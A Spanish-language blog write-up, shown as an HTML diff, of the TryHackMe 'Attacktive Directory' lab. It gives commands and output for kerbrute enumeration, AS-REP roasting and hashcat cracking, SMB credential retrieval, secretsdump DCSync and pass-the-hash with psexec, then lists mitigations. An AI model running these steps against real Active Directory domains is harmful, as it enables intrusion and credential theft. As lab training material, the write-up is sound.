@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina AttacktiveDirectory TryHackMe | ZsZsec</title>
+<meta content="Introducción La máquina Attacktive Directory simula un entorno basado en Active Directory, ofreciendo un escenario para practicar técnicas de enumeración, explotación y movimiento..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina AttacktiveDirectory TryHackMe<span>_</span></h1>
+<div class="writeup-meta"><span>AS-REP-ROASTING / Pass-the-hash / hashcat</span></div>
+<div class="tag-row"><span class="tag">AS-REP-ROASTING</span><span class="tag">Pass-the-hash</span><span class="tag">hashcat</span><span class="tag">active_directory</span><span class="tag">crackmapexec</span><span class="tag">smbclient</span><span class="tag">Nmap</span><span class="tag">kerbrute</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h1><strong>Introducción</strong></h1>
+<p>La máquina <em>Attacktive Directory</em> simula un entorno basado en Active Directory, ofreciendo un escenario para practicar técnicas de enumeración, explotación y movimiento lateral en redes Windows. Durante el proceso, se pone a prueba la capacidad de identificar usuarios válidos, explotar vulnerabilidades como <strong>AS-REP Roasting</strong>, realizar <strong>fuerza bruta de credenciales</strong>, acceder a <strong>recursos compartidos SMB</strong> y, posteriormente, escalar privilegios hasta el control total del dominio.</p>
+<h2>Enumeración de Puertos</h2>
+<p>Iniciamos el análisis con un escaneo agresivo usando Nmap para identificar todos los puertos abiertos, servicios y versiones en la máquina objetivo:</p>
+<pre><code class="language-bash">Nmap 7.95 scan initiated Wed Aug  6 18:07:12 2025 as: /usr/lib/nmap/nmap --privileged -sV -sS -Pn -p- -sC --min-rate 3000 -oN puertos.txt 10.201.110.217
+Nmap scan report for 10.201.110.217
+Host is up (0.23s latency).
+Not shown: 65509 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-06 23:07:44Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: THM-AD
+|   NetBIOS_Domain_Name: THM-AD
+|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+|   DNS_Domain_Name: spookysec.local
+|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-08-06T23:08:42+00:00
+| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+| Not valid before: 2025-08-05T23:06:28
+|_Not valid after:  2026-02-04T23:06:28
+|_ssl-date: 2025-08-06T23:08:51+00:00; -1s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49691/tcp open  msrpc         Microsoft Windows RPC
+49695/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-08-06T23:08:44
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+</code></pre>
+<p><strong>Servicios relevantes descubiertos:</strong></p>
+<ul>
+<li><strong>HTTP (80)</strong> – Microsoft IIS 10.0</li>
+<li><strong>Kerberos (88)</strong> – Servicio esencial de autenticación en AD</li>
+<li><strong>LDAP (389 / 3268)</strong> – Acceso a Active Directory</li>
+<li><strong>SMB (139, 445)</strong> – Compartición de archivos en red</li>
+<li><strong>RDP (3389)</strong> – Escritorio remoto habilitado</li>
+<li><strong>WinRM (5985)</strong> – Acceso remoto vía PowerShell</li>
+<li><strong>DNS (53)</strong> – Simple DNS Plus</li>
+</ul>
+<p>Además, mediante el script <code>rdp-ntlm-info</code>, se reveló información valiosa sobre el dominio:</p>
+<pre><code class="language-bash">NetBIOS_Domain_Name: THM-AD
+DNS_Domain_Name: spookysec.local
+DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+</code></pre>
+<p>Esto confirma que se trata de una máquina unida a un <strong>dominio Active Directory</strong>, lo cual nos permite enfocar el análisis en vectores como <strong>Kerberos, LDAP y SMB</strong></p>
+<h2>Enumeración de Usuarios – Kerberos (User Enumeration)</h2>
+<p>Sabíamos que el puerto 88 estaba abierto (Kerberos), lo cual nos permitió intentar una enumeración de usuarios con <code>kerbrute</code>, una herramienta diseñada para esta tarea.</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/attacktivead]
+└─$ kerbrute/dist/kerbrute_linux_amd64 userenum -d spookysec.local  --dc spookysec.local userlist.txt  
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 08/07/25 - Ronnie Flathers @ropnop
+
+2025/08/07 16:55:10 &gt;  Using KDC(s):
+2025/08/07 16:55:10 &gt;   spookysec.local:88
+
+2025/08/07 16:55:11 &gt;  [+] VALID USERNAME:       james@spookysec.local
+2025/08/07 16:55:15 &gt;  [+] svc-admin has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:4a715e1dc9bc6364ba90eee87a6f96df$b2080c2b1079d206c97a100bbcbea4b5e53f103e1cc256cffcd3666fbc7ca5aedabada2f7d2eac2356ce6ddbd1ade0cb7092bc8fcb7b4c1880d6302159bd8122ecc5ea6a06107dec031c43bd9f8608b50db50de5cb7d29a41b313bd5c74778ffdcbcbfcb6e85daeafa813b7a74bab805e48a2a13e62f1cc83a140cb6b43b00b0b619bceeabc5b0be5c5ce72c21a738ce6b1293a5b865933028d023d57c67fdc16b50d99cf16620efd7b0484ee6f086a7a2840919fe5b6cf11871a3dbc0889b8198777200837593f31fe6998fcd4e6b6bf0d10c305aaa1b6cdd7fa2f6773ee9692a1b9eaa5721063770f2149eacd0a80525a75174fc7af304ace3340c9ef9d98ebaf339e08                               
+2025/08/07 16:55:15 &gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
+2025/08/07 16:55:20 &gt;  [+] VALID USERNAME:       James@spookysec.local
+2025/08/07 16:55:22 &gt;  [+] VALID USERNAME:       robin@spookysec.local
+2025/08/07 16:55:42 &gt;  [+] VALID USERNAME:       darkstar@spookysec.local
+2025/08/07 16:55:54 &gt;  [+] VALID USERNAME:       administrator@spookysec.local
+2025/08/07 16:56:19 &gt;  [+] VALID USERNAME:       backup@spookysec.local
+2025/08/07 16:56:30 &gt;  [+] VALID USERNAME:       paradox@spookysec.local
+2025/08/07 16:57:44 &gt;  [+] VALID USERNAME:       JAMES@spookysec.local                                
+2025/08/07 16:58:08 &gt;  [+] VALID USERNAME:       Robin@spookysec.local
+</code></pre>
+<p>Usuarios válidos encontrados:</p>
+<pre><code class="language-bash">james, robin, darkstar, administrator, backup, paradox, ori, svc-admin
+</code></pre>
+<p>Y lo más importante: el usuario <code>svc-admin</code> fue marcado como vulnerable a <strong>AS-REP Roasting</strong>:</p>
+<pre><code class="language-bash">svc-admin has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:...
+</code></pre>
+<p><strong>Explicación técnica:</strong> Cuando una cuenta en AD tiene desactivada la opción <code>Do not require Kerberos preauthentication</code>, cualquier atacante puede solicitar un Ticket Granting Ticket (TGT) sin proporcionar contraseña. El KDC devuelve un mensaje cifrado con la clave del usuario, el cual puede ser crackeado offline por fuerza bruta.</p>
+<p><em>Kerberos permite identificar usuarios válidos dependiendo de la respuesta que devuelve el KDC ante solicitudes de autenticación inválidas.</em> Esto permite filtrar usuarios existentes en el dominio.</p>
+<h2>Cracking del Hash con Hashcat</h2>
+<p>Con el hash obtenido, procedimos a crackearlo con <code>hashcat</code> usando el modo <code>18200</code> (AS-REP etype 23):</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/attacktivead]
+└─$ hashcat -m 18200  hash.txt /usr/share/wordlists/rockyou.txt -O -w 3 --force
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.                                                                    
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-haswell-AMD Ryzen 5 7535HS with Radeon Graphics, 2898/5861 MB (1024 MB allocatable), 3MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 31
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Optimized-Kernel
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+                                                                                                                                                                                                                  
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt                                                                                                                                                                    
+* Passwords.: 14344385                                                                                                                                                                                            
+* Bytes.....: 139921507                                                                                                                                                                                           
+* Keyspace..: 14344385                                                                            admin@SPOOKYSEC.LOCAL:dbe3d29fbbb402c5d4c4fc1ae1275e57$0a3f38c17e8b9e7acbe527c52108f4d06ea0e818f9f73e8fa18558f3856745eafc9a06f368c7b09f3dd5edb61efc03c4b3be137de5578ef8820df344c854966c70ad0c0b91d15fbd932b179cc1ab79b30ecc40d2148e5522c74d82010a36ed4e2f0bc68982f09e69ec7eca3e38d599c913654a33dc38186b60ab6efff37b99e2e0638fc35e63cc5e9adef991c531cd7d39588ccfa54308d7efc4d0ffc433c2fb367982b1b6a53ac710c2440f890b17169b7e70c58a53c3e5a1f497a6f52c91ab75438e00286b0caf3f298301664c69b6e160db3a4b4b054b9d958ef8e6dafec07f09324e7731b6cae7abacef46f2a10b:PASSWORD
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:dbe3d29fbbb...f2a10b
+Time.Started.....: Wed Aug  6 20:11:44 2025, (8 secs)
+Time.Estimated...: Wed Aug  6 20:11:52 2025, (0 secs)
+Kernel.Feature...: Optimized Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   864.9 kH/s (1.04ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 5837979/14344385 (40.70%)
+Rejected.........: 1179/5837979 (0.02%)
+Restore.Point....: 5836443/14344385 (40.69%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: manamexico -&gt; man2119870
+Hardware.Mon.#1..: Util: 70%
+</code></pre>
+<p>Resultado:</p>
+<pre><code class="language-bash">svc-admin@spookysec.local : management2005
+</code></pre>
+<p>Contraseña crackeada exitosamente: <code>management2005</code></p>
+<p>Esto nos proporciona <strong>credenciales válidas de un usuario del dominio</strong>, posiblemente con permisos elevados debido al nombre del usuario (<code>svc-admin</code> suele ser una cuenta de servicio o administración).</p>
+<h2>Acceso al recurso SMB y obtención de credenciales</h2>
+<p>Tras comprometer el usuario <code>svc-admin</code>, se procedió a autenticar contra el recurso compartido SMB del controlador de dominio.</p>
+<p><strong>Enumeracion de Shares</strong></p>
+<pre><code class="language-bash">smbclient -L 10.201.48.249 -U svc-admin
+</code></pre>
+<p><strong>Shares disponibles:</strong></p>
+<ul>
+<li><code>backup</code></li>
+<li><code>NETLOGON</code></li>
+<li><code>SYSVOL</code></li>
+<li><code>ADMIN$</code></li>
+<li><code>IPC$</code></li>
+<li><code>C$</code></li>
+</ul>
+<p>De estos, el recurso <strong><code>backup</code></strong> era accesible con las credenciales de <code>svc-admin</code>.</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/attacktivead]
+└─$ smbclient //10.201.48.249/backup -U svc-admin -p 
+Password for [WORKGROUP\svc-admin]:
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sat Apr  4 14:08:39 2020
+  ..                                  D        0  Sat Apr  4 14:08:39 2020
+  backup_credentials.txt              A       48  Sat Apr  4 14:08:53 2020
+g
+                8247551 blocks of size 4096. 3561732 blocks available
+smb: \&gt; get backup_credentials.txt
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \&gt; exit
+</code></pre>
+<h2>Decodificación de credenciales</h2>
+<p>El contenido del archivo era una cadena codificada:</p>
+<p>Esta cadena, al ser pasada por <strong>CyberChef</strong> usando el filtro <code>Magic</code>, reveló las credenciales en texto claro:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/9f9d5ba8-542c-48f7-8ab0-230233968596"/></p>
+<pre><code class="language-bash">Usuario: backup@spookysec.local  
+Contraseña: ********
+</code></pre>
+<h2>Técnica de <strong>Pass-The-Hash</strong> para extraer hashes del Dominio</h2>
+<p>Con las credenciales del usuario <code>backup</code>, se ejecutó la herramienta <strong><code>impacket-secretsdump</code></strong> utilizando la técnica <code>Pass-The-Hash</code>. Este usuario tenía privilegios suficientes para realizar una replicación del controlador de dominio y extraer los hashes de todos los usuarios.</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/attacktivead]
+└─$ impacket-secretsdump -just-dc-ntlm  spookysec.local/backup:*****@10.201.5.168 
+</code></pre>
+<p><strong>Resultado:</strong><br/>
+Se obtuvieron hashes NTLM válidos de usuarios del dominio, incluyendo:</p>
+<pre><code class="language-bash">Administrator:500:...:0e0363213e37b9422140bcb4fc:::
+...
+svc-admin:1114:...:fc0f1e5359e372aa1473ba6809:::
+backup:1118:...:19741bde08e135f4b40f1a9a45538:::
+</code></pre>
+<p>Especial atención al hash de <code>Administrator</code>, que será utilizado para escalar privilegios y obtener acceso total al sistema.</p>
+<h2>Ejecución remota con <strong>Pass-The-Hash</strong> utilizando <code>psexec</code></h2>
+<p>Con el hash del usuario <code>Administrator</code>, se empleó la herramienta <code>impacket-psexec</code> para obtener una shell con privilegios de SYSTEM sobre el DC.</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/attacktivead]
+└─$ impacket-psexec SPOOKYSEC.LOCAL/'Administrator'@10.201.5.168 -hashes :0e0363213ecb4fc
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.201.5.168.....
+[*] Found writable share ADMIN$
+[*] Uploading file YqDIXQBy.exe
+[*] Opening SVCManager on 10.201.5.168.....
+[*] Creating service TrRA on 10.201.5.168.....
+[*] Starting service TrRA.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1490]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; 
+</code></pre>
+<p>Esto otorgó una shell remota completamente privilegiada sobre el sistema.</p>
+<h2><strong>Conclusión de la máquina</strong></h2>
+<p>El compromiso del dominio <strong>spookysec.local</strong> se logró a través de una cadena de vulnerabilidades y malas prácticas comunes en entornos Active Directory:</p>
+<ol>
+<li><strong>Mala configuración de cuentas</strong> que permitía ataques <strong>AS-REP Roasting</strong> (pre-autenticación Kerberos deshabilitada).</li>
+<li><strong>Almacenamiento inseguro de credenciales</strong> en recursos compartidos SMB accesibles a usuarios no privilegiados.</li>
+<li><strong>Privilegios excesivos</strong> otorgados a cuentas de servicio, en este caso <code>backup</code>, que podían replicar la base de datos del AD.</li>
+<li><strong>Falta de protecciones contra Pass-The-Hash</strong>, lo que permitió el uso de hashes NTLM para autenticación directa sin contraseñas.</li>
+</ol>
+<p>Una vez encadenados estos fallos, fue posible escalar privilegios de un usuario de bajo nivel hasta <strong>Domain Administrator</strong> y tomar control total del dominio.</p>
+<h1>Tecnicas Utilizadas</h1>
+<table>
+<thead>
+<tr>
+<th>Fase del ataque</th>
+<th>Técnica utilizada</th>
+<th>Descripción</th>
+<th>Mitigación</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Enumeración de usuarios</td>
+<td><strong>User enumeration con Kerbrute</strong></td>
+<td>Fuerza bruta de nombres de usuario para identificar cuentas válidas.</td>
+<td>Restringir el error de autenticación, habilitar lockout policies y monitorear intentos fallidos.</td>
+</tr>
+<tr>
+<td>Obtención inicial de credenciales</td>
+<td><strong>AS-REP Roasting</strong></td>
+<td>Extracción de hashes Kerberos de cuentas sin pre-autenticación y crackeo offline.</td>
+<td>Habilitar Kerberos pre-authentication en todas las cuentas.</td>
+</tr>
+<tr>
+<td>Acceso lateral</td>
+<td><strong>SMB enumeration</strong></td>
+<td>Listado y acceso a shares SMB con credenciales comprometidas.</td>
+<td>Aplicar control de acceso granular a shares y auditar accesos.</td>
+</tr>
+<tr>
+<td>Extracción de credenciales adicionales</td>
+<td><strong>Archivo con credenciales en texto claro (Base64)</strong></td>
+<td>Decodificación de contraseñas encontradas en un recurso compartido.</td>
+<td>No almacenar contraseñas en texto plano o codificadas; usar gestores seguros.</td>
+</tr>
+<tr>
+<td>Escalada de privilegios en AD</td>
+<td><strong>DCSync con SecretsDump</strong></td>
+<td>Solicitud de replicación del AD para extraer hashes NTLM de todos los usuarios.</td>
+<td>Restringir privilegios de <code>Replicating Directory Changes</code> solo a controladores de dominio.</td>
+</tr>
+<tr>
+<td>Movimiento lateral / acceso remoto</td>
+<td><strong>Pass-The-Hash con PsExec</strong></td>
+<td>Autenticación remota con hashes NTLM para obtener shell privilegiada.</td>
+<td>Implementar Credential Guard, restringir NTLM, y segmentar administradores.</td>
+</tr>
+</tbody>
+</table>
+<h2><strong>Recomendaciones generales</strong></h2>
+<ul>
+<li><strong>Endurecimiento de Active Directory:</strong> Revisar periódicamente la configuración de cuentas de servicio y privilegios de replicación.</li>
+<li><strong>Políticas de contraseñas y autenticación:</strong> Implementar contraseñas robustas, rotación periódica y habilitar MFA donde sea posible.</li>
+<li><strong>Segmentación de red:</strong> Limitar el acceso a servicios administrativos solo desde estaciones seguras.</li>
+<li><strong>Auditorías periódicas:</strong> Revisar accesos SMB, cambios en cuentas y privilegios administrativos.</li>
+<li><strong>Defensa contra Pass-The-Hash:</strong> Activar Credential Guard y NTLMv2, así como restringir el uso de cuentas de administrador en hosts comunes.</li>
+</ul>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
